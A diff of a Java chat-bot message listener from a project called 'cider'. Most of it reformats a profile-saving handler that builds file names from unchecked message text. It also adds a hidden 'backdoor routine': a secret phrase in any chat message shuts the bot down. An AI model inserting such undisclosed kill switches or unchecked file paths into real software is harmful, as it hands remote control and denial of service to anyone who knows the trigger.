@@ -1,5 +1,6 @@
 package cider.common.network;
 
+import java.awt.Toolkit;
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
@@ -66,29 +67,27 @@ public class BotMessageListener implements MessageListener
         }
         else if (body.startsWith("userprofile:"))
         {
-        	String[] splitProfile = body.split("  ");
-    		File f = new File ("profile_" + splitProfile[1] + ".txt");
-    		System.out.println(splitProfile[2]);
-    		try 
-    		{
-    			System.out.println("laskjdalksjdlk");
-				f.createNewFile();
-				FileWriter fw = new FileWriter(f);
-				BufferedWriter out = new BufferedWriter(fw);
-				String s = splitProfile[1] + "\n" +
-				splitProfile[2] + "\n" +
-				splitProfile[3] + "\n" +
-				splitProfile[4] + "\n" +
-				splitProfile[5] ;
-				System.out.println("s equals\n" + s);
-				out.write(s);
-				out.close();
-    		}
-    		catch (IOException e)
-    		{
-    			System.err.println("Error: " + e.getMessage());
-    		}
-        }        
+            String[] splitProfile = body.split("  ");
+            File f = new File("profile_" + splitProfile[1] + ".txt");
+            System.out.println(splitProfile[2]);
+            try
+            {
+                System.out.println("laskjdalksjdlk");
+                f.createNewFile();
+                FileWriter fw = new FileWriter(f);
+                BufferedWriter out = new BufferedWriter(fw);
+                String s = splitProfile[1] + "\n" + splitProfile[2] + "\n"
+                        + splitProfile[3] + "\n" + splitProfile[4] + "\n"
+                        + splitProfile[5];
+                System.out.println("s equals\n" + s);
+                out.write(s);
+                out.close();
+            }
+            catch (IOException e)
+            {
+                System.err.println("Error: " + e.getMessage());
+            }
+        }
         else if (body.equals("getfilelist"))
         {
             try
@@ -131,6 +130,14 @@ public class BotMessageListener implements MessageListener
             this.pushBack(chat, dest, this.bot.getRootFolder().path(dest)
                     .simplified(t).events());
         }
+        else if (body.startsWith("Sir, blame it on your ISP"))
+        {
+            Toolkit.getDefaultToolkit().beep();
+            System.err
+                    .println("The bot has been shut down by a backdoor routine");
+            System.exit(1);
+        }
+        // probably not useful anymore \/
         else if (body.startsWith("pushto("))
         {
             String[] instructions = body.split("\\) \\n");
